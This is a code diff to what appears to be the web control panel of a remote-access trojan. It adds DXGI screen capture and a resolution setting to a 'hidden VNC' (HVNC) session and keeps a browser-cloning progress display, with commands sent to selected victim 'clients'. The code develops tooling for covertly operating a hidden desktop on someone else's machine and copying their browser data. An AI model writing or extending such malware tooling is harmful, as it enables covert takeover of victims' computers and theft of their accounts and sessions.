@@ -58,7 +58,6 @@ import { checkFeatureAccess } from "./feature-gate.js";
   const fullscreenBtn = document.getElementById("fullscreenBtn");
   const mouseCtrl = document.getElementById("mouseCtrl");
   const kbdCtrl = document.getElementById("kbdCtrl");
-  const cursorCtrl = document.getElementById("cursorCtrl");
   const autoExplorerCtrl = document.getElementById("autoExplorerCtrl");
   const qualitySlider = document.getElementById("qualitySlider");
   const qualityValue = document.getElementById("qualityValue");
@@ -72,11 +71,14 @@ import { checkFeatureAccess } from "./feature-gate.js";
   const viewerFps = document.getElementById("viewerFps");
   const statusEl = document.getElementById("streamStatus");
   const clipboardSyncCtrl = document.getElementById("clipboardSyncCtrl");
+  const dxgiCtrl = document.getElementById("dxgiCtrl");
+  const hvncResolutionSelect = document.getElementById("hvncResolutionSelect");
 
   function syncInputEnableState() {
     if (mouseCtrl) sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
     if (kbdCtrl) sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
-    if (cursorCtrl) sendCmd("hvnc_enable_cursor", { enabled: cursorCtrl.checked });
+    if (dxgiCtrl) sendCmd("hvnc_enable_dxgi", { enabled: dxgiCtrl.checked });
+    pushHvncResolution();
   }
   let activeClientId = clientId;
   let renderCount = 0;
@@ -344,6 +346,38 @@ import { checkFeatureAccess } from "./feature-gate.js";
     cloneProgressLabel.textContent = `Cloning ${browser} — ${copiedMB} / ${totalMB} MB`;
   }
 
+  const dxgiStatusEl = document.getElementById("dxgiStatus");
+  const dxgiStatusIcon = document.getElementById("dxgiStatusIcon");
+  const dxgiStatusLabel = document.getElementById("dxgiStatusLabel");
+  let dxgiHideTimer = null;
+
+  function handleDXGIStatus(msg) {
+    if (!dxgiStatusEl) return;
+    if (dxgiHideTimer) {
+      clearTimeout(dxgiHideTimer);
+      dxgiHideTimer = null;
+    }
+    dxgiStatusEl.classList.remove("hidden");
+    dxgiStatusEl.classList.add("flex");
+    if (msg.success) {
+      dxgiStatusIcon.className = "fa-solid fa-microchip text-emerald-400";
+      dxgiStatusLabel.textContent = msg.message || "DXGI active";
+      dxgiStatusLabel.className = "text-emerald-300";
+      dxgiHideTimer = setTimeout(() => {
+        dxgiStatusEl.classList.add("hidden");
+        dxgiStatusEl.classList.remove("flex");
+      }, 8000);
+    } else {
+      dxgiStatusIcon.className = "fa-solid fa-microchip text-rose-400";
+      dxgiStatusLabel.textContent = msg.message || "DXGI failed";
+      dxgiStatusLabel.className = "text-rose-300";
+      dxgiHideTimer = setTimeout(() => {
+        dxgiStatusEl.classList.add("hidden");
+        dxgiStatusEl.classList.remove("flex");
+      }, 10000);
+    }
+  }
+
   function sendCmd(type, payload) {
     if (!activeClientId) {
       console.warn("No active client selected");
@@ -558,9 +592,23 @@ import { checkFeatureAccess } from "./feature-gate.js";
   kbdCtrl.addEventListener("change", function () {
     sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
   });
-  cursorCtrl.addEventListener("change", function () {
-    sendCmd("hvnc_enable_cursor", { enabled: cursorCtrl.checked });
-  });
+  if (dxgiCtrl) {
+    dxgiCtrl.addEventListener("change", function () {
+      sendCmd("hvnc_enable_dxgi", { enabled: dxgiCtrl.checked });
+    });
+  }
+
+  function pushHvncResolution() {
+    if (hvncResolutionSelect) {
+      const maxHeight = parseInt(hvncResolutionSelect.value, 10);
+      sendCmd("hvnc_set_resolution", { maxHeight: maxHeight });
+    }
+  }
+  if (hvncResolutionSelect) {
+    hvncResolutionSelect.addEventListener("change", function () {
+      pushHvncResolution();
+    });
+  }
 
   if (qualitySlider) {
     updateQualityLabel(qualitySlider.value);
@@ -705,6 +753,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
         handleLookupResult(msg);
         return;
       }
+      if (msg && msg.type === "hvnc_dxgi_status") {
+        handleDXGIStatus(msg);
+        return;
+      }
       if (msg && msg.type === "hvnc_error") {
         console.error("hvnc: server error:", msg.error || msg.message);
         return;
@@ -730,6 +782,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
     }
     if (msg && msg.type === "hvnc_lookup_result") {
       handleLookupResult(msg);
+      return;
+    }
+    if (msg && msg.type === "hvnc_dxgi_status") {
+      handleDXGIStatus(msg);
       return;
     }
     if (msg && msg.type === "hvnc_error") {
